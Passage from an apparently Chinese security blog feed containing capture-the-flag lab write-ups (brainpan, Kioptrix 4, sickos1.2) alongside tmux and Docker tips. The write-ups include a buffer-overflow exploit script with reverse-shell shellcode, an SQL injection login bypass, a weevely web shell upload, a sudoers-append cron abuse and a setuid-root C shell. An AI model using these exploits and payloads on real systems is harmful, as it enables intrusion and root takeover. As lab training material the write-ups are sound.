class="string">"send paylaod"</span>)</span><br><span class="line">s.send(payload)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020052922530549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有发现坏字符</p>
<ul>
<li>寻找地址固定的系统模块<br>使用mona模块查找固定模块</li>
</ul>
<blockquote>
<p><a href="https://github.com/corelan/mona" target="_blank" rel="noopener">https://github.com/corelan/mona</a></p>
</blockquote>
<p>把mona模块放入C:\xxx\Immunity Inc\Immunity Debugger\PyCommands目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure>
<p>一般选用 false false false false true 的模块<br><img src="https://img-blog.csdnimg.cn/20200530183727883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb </span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">00000000  FFE4              jmp esp</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!mona find -s <span class="string">"\xff\xe4"</span> -m brainpan.exe</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200530184105730.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200530184118436.png" alt="在这里插入图片描述"><br> 设置断点，检查该模块是否可用性<br><img src="https://img-blog.csdnimg.cn/20200530184233252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">524</span>+<span class="string">"\xf3\x12\x17\x31"</span>+<span class="string">"C"</span>*<span class="number">600</span> </span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"connect target"</span>)</span><br><span class="line">s.connect((<span class="string">'192.168.80.100'</span>,<span class="number">9999</span>))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"send paylaod"</span>)</span><br><span class="line">s.send(payload)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>断点触发<br><img src="https://img-blog.csdnimg.cn/20200530184343448.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200530184450254.png" alt="在这里插入图片描述"><br>可见esp被C覆盖了</p>
<ul>
<li>写入shellcode</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -l payload |grep linux </span><br><span class="line">msfvenom -p linux/x86/shell_reverse_tcp -b <span class="string">"\x00"</span> lhost=192.168.80.2 lport=4444 -f python</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xb8\xef\x0a\xda\x14\xdb\xcb\xd9\x74\x24\xf4\x5b\x2b"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x04\xf6\x38"</span></span><br><span class="line">buf += <span class="string">"\xe1\xeb\xdc\x4a\xe9\x58\xa0\xe7\x84\x5c\xaf\xe9\xe9"</span></span><br><span class="line">buf += <span class="string">"\x06\x62\x69\x9a\x9f\xcc\x55\x50\x9f\x64\xd3\x93\xf7"</span></span><br><span class="line">buf += <span class="string">"\xb6\x8b\x34\x05\x5f\xce\xb4\x18\xc3\x47\x55\xaa\x9d"</span></span><br><span class="line">buf += <span class="string">"\x07\xc7\x99\xd2\xab\x6e\xfc\xd8\x2c\x22\x96\x8c\x03"</span></span><br><span class="line">buf += <span class="string">"\xb0\x0e\x39\x73\x19\xac\xd0\x02\x86\x62\x70\x9c\xa8"</span></span><br><span class="line">buf += <span class="string">"\x32\x7d\x53\xaa"</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">524</span>+<span class="string">"\xf3\x12\x17\x31"</span>+<span class="string">"\x90"</span>*<span class="number">8</span>+buf</span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"connect target"</span>)</span><br><span class="line">s.connect((<span class="string">'192.168.80.6'</span>,<span class="number">9999</span>))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"send paylaod"</span>)</span><br><span class="line">s.send(payload)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>\x90 表示NULL，多个空字符，用于平滑执行shellcode</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200530191136496.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200530191429327.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/202005301919100.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util manual ls</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020053019231873.png" alt="在这里插入图片描述"><br>发现执行了man 指令（man ls）</p>
<ul>
<li>man提权</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200530192418481.png" alt="在这里插入图片描述"><br>END<br><img src="https://img-blog.csdnimg.cn/20200530192438159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>缓冲区溢出简介<br>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，覆盖相邻内存区域的数据，然后可以<ul>
<li>修改内存数据</li>
<li>造成进程劫持</li>
<li>执行恶意代码</li>
<li>获取服务器控制器</li>
</ul>
</li>
<li>发现漏洞的方法：<ul>
<li>源码审计</li>
<li>逆向工程</li>
<li>模糊测试<br> 向程序堆栈半随机数据，根据内存变化判断溢出<br> 数据生成器：生成随机、半随机数据<br> 测试工具：识别溢出漏洞</li>
<li>对未知协议，可以查RFC或用wireshark抓包</li>
</ul>
</li>
</ul>
<p>基本流程</p>
<ul>
<li>模糊测试（获取存在溢出的指令）<br>通过模糊测试找到存在缓冲区溢出的指令</li>
<li>定位边界<br>精确覆盖寄存器EIP内容<br>使用脚本，通过唯一字符串方法定位<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span><br></pre></td></tr></table></figure>
计算覆盖位置</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134</span><br></pre></td></tr></table></figure>
<ul>
<li><p>探寻存放shellcode的寄存器<br>计算寄存器可用的空间大小</p>
</li>
<li><p>剔除坏字符<br>在待写入shellcode的寄存器中写入十六进制字符，剔除其中不可用的字符</p>
</li>
<li><p>寻找地址固定的系统模块</p>
</li>
<li><p>写入shellcode</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp -b “\x00” LHOST=192.168.182.149 LPORT=443 -f python</span><br></pre></td></tr></table></figure>


</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Vulhub Kioptix Level 4</title>
    <url>/2020/08/21/Vulhub%20Kioptix%20Level%204/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>sql注入</li>
<li>获取非受限的shell</li>
</ul>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200515192403708.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p-   --min-rate=1000 192.168.80.5 &gt;port</span><br><span class="line">ports=$(cat port | awk -F <span class="string">" "</span> <span class="string">'&#123;print $1&#125;'</span> | awk -F <span class="string">"/"</span> <span class="string">'&#123;print $1&#125;'</span> | sort -n | tr <span class="string">'\n'</span> <span class="string">','</span> | sed <span class="string">'s/[^0-9]*//'</span>)</span><br><span class="line">nmap -sC -sV -T4 -p <span class="variable">$ports</span> 192.168.80.5 -oA nmap/nmap</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200515192704351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.80.5 -w /usr/share/wordlists/dirb/big.txt -t50  -o dir.out</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200515195747612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515203212296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515203326891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john</span><br><span class="line"><span class="string">' OR 1=1#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200515204422914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515204622384.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh robert@192.168.80.5</span><br></pre></td></tr></table></figure>

<ul>
<li>获取非受限的shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> python: exit_code = os.system(<span class="string">'/bin/sh'</span>) output = os.popen(<span class="string">'/bin/sh'</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">cat congrats.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020051521030044.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Vulhub sickos1.2</title>
    <url>/2020/08/21/Vulhub%20sickos1.2/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>Curl上传文件</li>
<li>chkrootkit提权</li>
<li>C小脚本编写</li>
</ul>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200510193956102.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -T4 192.168.80.4</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020051019414476.png" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>站点目录爆破</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.80.4 -w /usr/share/wordlists/dirb/big.txt -t50  -o dir.out</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020051019425681.png" alt="在这里插入图片描述"></p>
<ul>
<li>通过 Curl上传文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看可用选项</span></span><br><span class="line">curl -X OPTIONS -v http://192.168.80.4/<span class="built_in">test</span></span><br><span class="line"><span class="comment">#生成webshell</span></span><br><span class="line">weevely generate 123 pass.php  </span><br><span class="line"><span class="comment">#上传文件 </span></span><br><span class="line">curl -f -T pass.php http://192.168.80.4/<span class="built_in">test</span>/ --http1.0 -v</span><br></pre></td></tr></table></figure>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul>
<li>连接shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weevely http://192.168.80.4/<span class="built_in">test</span>/pass.php 123</span><br></pre></td></tr></table></figure>

<ul>
<li>信息收集</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la /etc/cron*</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200511085253983.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkrootkit -V</span><br><span class="line"><span class="comment">#chkrootkit version 0.49</span></span><br><span class="line">searchsploit  chkrootkit</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200511085522323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>chkrootkit有crontab，会定期以root身份执行/tmp/update文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch update</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"chmod +w /etc/sudoers &amp;&amp; echo 'www-data ALL=(ALL)NOPASSWD:ALL' &gt;&gt; /etc/sudoers"</span> &gt;update</span><br><span class="line"><span class="comment">#echo "chmod 777 /root"&gt;update</span></span><br><span class="line">chmod 777 update</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200511090620557.png" alt="在这里插入图片描述"></p>
<ul>
<li>编写C脚本提权</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">"chown root:root /tmp/update"</span>);</span><br><span class="line">system(<span class="string">"chmod 4755 /tmp/update"</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 755和chmod 4755的区别</span><br><span class="line">4表示其他用户执行文件时，具有与所有者相当的权限。</span><br><span class="line"></span><br><span class="line">execl与system区别</span><br><span class="line"></span><br><span class="line">execl()用来执行参数path字符串所代表的文件路径， 接下来的参数代表执行该文件时传递的argv[0],argv[1].....是后一个参数必须用空指针NULL作结束</span><br><span class="line">返回值  成功则不返回值， 失败返回-1， 失败原因存于errno中</span><br><span class="line"><span class="comment">#int execl(const char *path, const char *arg, ...);</span></span><br><span class="line"><span class="comment"># execl("/bin/ls", "ls", "-al", "/etc/passwd", NULL);</span></span><br><span class="line"></span><br><span class="line">system()会调用fork()产生子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。在调用system()期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。</span><br><span class="line">返回值</span><br><span class="line">=-1:出现错误   </span><br><span class="line">=0:调用成功但是没有出现子进程   </span><br><span class="line">&gt;0:成功退出的子进程的id</span><br><span class="line">如果system()在调用/bin/sh时失败则返回127，其他失败原因返回-1。</span><br><span class="line"><span class="comment">#int system(const char * string);</span></span><br><span class="line"><span class="comment">#system("chown root:root /tmp/update");</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o update exp.c</span><br><span class="line">./update</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200511093151309.png" alt="在这里插入图片描述"></p>
<p>END<br><img src="https://img-blog.csdnimg.cn/20200511093210741.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>tmux 杂技</title>
    <url>/2020/08/21/tmux%20%E6%9D%82%E6%8A%80/</url>
    <content><![CDATA[<p>tmux 常规操作</p>
<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><ul>
<li>创建会话</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux  			  # 新建一个无名称的会话</span><br><span class="line">tmux new -s demo  # 新建一个名称为demo的会话</span><br></pre></td></tr></table></figure>

<ul>
<li>断开当前会话</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux 	   detach     </span><br><span class="line">Ctrl+b     D</span><br></pre></td></tr></table></figure>

<ul>
<li>查看所有会话<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux	   ls</span><br></pre></td></tr></table></figure></li>
<li>进入会话</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux    a 	     # 默认进入第一个会话</span><br><span class="line">tmux a -t demo	 # 进入到名称为demo的会话</span><br></pre></td></tr></table></figure>
<h2 id="window"><a href="#window" class="headerlink" title="window"></a>window</h2><ul>
<li>建立窗口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctrl+b   c</span><br></pre></td></tr></table></figure>

<ul>
<li>重命名窗口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctrl+b   ，</span><br></pre></td></tr></table></figure>

<ul>
<li>切换窗口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctrl+b 		p        #切换到上一个窗口</span><br><span class="line">Ctrl+b      n		 #切换到下一个窗口</span><br></pre></td></tr></table></figure>
<h2 id="pane"><a href="#pane" class="headerlink" title="pane"></a>pane</h2><ul>
<li>分割窗口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctrl+b 		“        #上下分割</span><br><span class="line">Ctrl+b  	%  		 #左右分割</span><br></pre></td></tr></table></figure>
<ul>
<li>最大化窗口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctrl+b 	   z</span><br></pre></td></tr></table></figure>
<ul>
<li>移动光标，选择面板</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctrl+b   	方向键</span><br></pre></td></tr></table></figure>

<ul>
<li>复制、粘贴</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctrl+b   	[			#进入复制模式</span><br><span class="line">Ctrl+b		空格			#选择复制内容</span><br><span class="line">Ctrl+b 		q 			#退出复制模式</span><br><span class="line">Ctrl+b		] 			#粘贴</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Docker 杂技</title>
    <url>/2020/08/21/Docker%20%E6%9D%82%E6%8A%80/</url>
    <content><![CDATA[<h2 id="权限不够"><a href="#权限不够" class="headerlink" title="权限不够"></a>权限不够</h2><ul>
<li><p>报错<br>RTNETLINK answers: Operation not permitted<br>Docker containers do not have full privileges by default. Try adding this to the docker run command</p>
</li>
<li><p>解决<br>提示权限不够，非docker 直接 su root 即可</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">cap</span>-add=NET_ADMIN   -it   IMAGEID</span><br></pre></td></tr></table></figure>

<h2 id="删除父镜像报错"><a href="#删除父镜像报错" class="headerlink" title="删除父镜像报错"></a>删除父镜像报错</h2><ul>
<li><p>报错<br>Error response from daemon: conflict: unable to delete 6fa48e047721 (cannot be forced) - image has dependent child images</p>
</li>
<li><p>解决</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a | grep <span class="string">"Exited"</span> | awk <span class="string">'&#123;print $1 &#125;'</span>)</span><br><span class="line">docker rm $(docker ps -a | grep <span class="string">"Exited"</span> | awk <span class="string">'&#123;print $1 &#125;'</span>) </span><br><span class="line">或</span><br><span class="line">docker rm -v $(docker ps -aq -f status=exited)</span><br><span class="line">删除镜像</span><br><span class="line">docker rmi $(docker images | grep <span class="string">"none"</span> | awk <span class="string">'&#123;print $3&#125;'</span>)</span><br><span class="line">或</span><br><span class="line">docker rmi 镜像ID:版本号 -f</span><br></pre></td></tr></table></figure>

<h2 id="镜像别名冲突"><a href="#镜像别名冲突" class="headerlink" title="镜像别名冲突"></a>镜像别名冲突</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看冲突镜像 </span></span><br><span class="line">docker ps -l </span><br><span class="line"><span class="comment">#删除容器</span></span><br><span class="line">docker rm 镜像ID</span><br></pre></td></tr></table></figure>

<h2 id="镜像名更改"><a href="#镜像名更改" class="headerlink" title="镜像名更改"></a>镜像名更改</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag imageID  NewImageID:tag</span><br></pre></td></tr></table></figure>

<h2 id="Docker-与win10物理机无法共享文件"><a href="#Docker-与win10物理机无法共享文件" class="headerlink" title="Docker 与win10物理机无法共享文件"></a>Docker 与win10物理机无法共享文件</h2><ul>
<li>报错</li>
</ul>
<p>Firewall detected<br>A firewall is blocking file Sharing between Windows and the containers.</p>
<ul>
<li>解决<br>根据提示可知为防火墙配置问题;【官网提示445端口必须开启】<br>找到防火墙配置，发现445配关闭且不能被修改<br>进入 【控制面板\系统和安全\管理工具\本地安全策略】<br><img src="https://img-blog.csdnimg.cn/20200507090256657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可在此直接删除配置；</li>
</ul>
<h2 id="docker镜像下载速度太慢"><a href="#docker镜像下载速度太慢" class="headerlink" title="docker镜像下载速度太慢"></a>docker镜像下载速度太慢</h2><ul>
<li>报错</li>
</ul>
<p>ERROR:Get<a href="https://registry1.docker.io/v2/c0ny1/webgoat-server/manifests/v8.0.0.M14" target="_blank" rel="noopener">https://registry1.docker.io/v2/c0ny1/webgoat-server/manifests/v8.0.0.M14</a>: net/http: TLS handshake timeout   </p>
<ul>
<li>解决方法</li>
</ul>
<ol>
<li>添加国内镜像（建议使用阿里镜像源）</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [</span><br><span class="line">    <span class="string">"镜像地址"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>配置DNS解析</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br><span class="line"><span class="comment">#加入DNS服务</span></span><br><span class="line">dns-nameservers 8.8.8.8</span><br><span class="line"><span class="comment">#重启网络</span></span><br><span class="line">service networking restart</span><br></pre></td></tr></table></figure>

<p>接下来就直接起飞～芜湖～</p>
<h2 id="docker端口映射之后nmap扫描显示filtered"><a href="#docker端口映射之后nmap扫描显示filtered" class="headerlink" title="docker端口映射之后nmap扫描显示filtered"></a>docker端口映射之后nmap扫描显示filtered</h2><ul>
<li>报错</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200602203218573.png" alt="在这里插入图片描述"></p>
<ul>
<li>解决方法</li>
</ul>
<ol>
<li>关闭防火墙</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要安装ufw命令</span></span><br><span class="line">apt-get install ufw</span><br><span class="line">ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>执行如下命令</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span>  <span class="string">"net.ipv4.ip_forward = 1"</span>  &gt;&gt;  /usr/lib/sysctl.d/00-system.conf</span><br><span class="line">service networking restart</span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure>



<h1 id="error-during-connect"><a href="#error-during-connect" class="headerlink" title="error  during  connect:"></a>error  during  connect:</h1><ul>
<li><p>报错</p>
<p>Get http://%2F%2F.%2Fpipe%2Fdocker_engine/v1.40/containers/json: open //./pipe/docker_engine: The system cannot find the file specified. In the default daemon configuration on Windows, the docker client must be run elevated to connect. This error may also indicate that the docker daemon is not running.</p>
</li>
<li><p>解决方法<br>方法1：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">"C:\Program Files\Docker\Docker"</span></span><br><span class="line">DockerCli.exe -SwitchDaemon</span><br></pre></td></tr></table></figure>
<p>方法二：<br>在你的docker desktop的小图标上右键，找到Setting–&gt; General–&gt;勾选Expose daemon on tcp localhost那个选项。重启</p>
</li>
</ul>
<h1 id="Hyper-V-not-available"><a href="#Hyper-V-not-available" class="headerlink" title="Hyper-V  not available"></a>Hyper-V  not available</h1><ul>
<li>报错</li>
</ul>
<p>Hyper-V service vmms is not available</p>
<ul>
<li>解决方法<br>启用 Hyper-V</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All</span><br><span class="line"><span class="comment">## 或</span></span><br><span class="line">DISM /Online /Enable-Feature /All /FeatureName:Microsoft-Hyper-V</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Vulhub sickos1.1</title>
    <url>/2020/08/21/Vulhub%20sickos1.1/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>Squid 站点代理</li>
</ul>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.80.1-200</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200506210047307.png" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>端口扫描</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.80.1 -oA nmap&#x2F;nmap</span><br></pre></td></tr></table></figure>
